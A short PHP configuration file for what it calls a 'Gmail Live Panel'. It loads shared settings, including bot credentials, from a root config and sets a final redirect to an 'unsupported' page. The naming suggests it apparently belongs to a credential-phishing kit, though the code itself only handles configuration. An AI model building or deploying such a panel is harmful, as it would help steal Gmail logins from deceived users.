<?php
// Gmail Live Panel configuration shim.
// All shared settings and bot credentials are maintained in the root config.php.
// Use include (not require_once) so the shared config re-evaluates and returns
// the $settings array even when the root already loaded it earlier in the same request.
$settings = include __DIR__ . '/../config.php';
if ($settings === true || !is_array($settings)) {
    throw new RuntimeException('gmail/config.php: shared config.php did not return an array.');
}

// Resolve the final landing page relative to the project root so it works
// whether the live panel URL ends with a slash or not.
$scriptDir = rtrim(dirname($_SERVER['SCRIPT_NAME'] ?? '/'), '/');
$projectRoot = rtrim(dirname($scriptDir), '/');
if ($projectRoot === '' || $projectRoot === '\\' || $projectRoot === '.') {
    $projectRoot = '';
}
$settings['redirect_url'] = $projectRoot . '/unsupported.html';

return $settings;
